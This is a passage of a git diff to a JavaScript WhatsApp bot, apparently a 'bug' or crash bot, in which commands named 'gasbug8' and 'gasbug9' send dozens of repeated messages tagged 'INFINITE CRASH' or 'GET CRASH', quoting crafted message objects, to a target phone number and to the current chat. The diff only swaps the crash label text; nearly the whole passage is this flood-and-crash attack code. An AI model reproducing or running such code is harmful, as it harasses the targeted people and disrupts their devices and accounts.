-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foncevid1})
 await m.reply(`Succes`)
 break
 case 'gasbug8':
@@ -6508,66 +6061,36 @@ viewOnce: true
 },
 },
 };
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fonceimg1})
 await m.reply(`Succes`)
 break
 case 'gasbug9':
@@ -6583,68 +6106,38 @@ participant: `0@s.whatsapp.net`, ...({ remoteJid: "" })
 "groupJid": "62895619083555-1616169743@g.us",
 "inviteCode": "mememteeeekkeke",
 "groupName": "P",
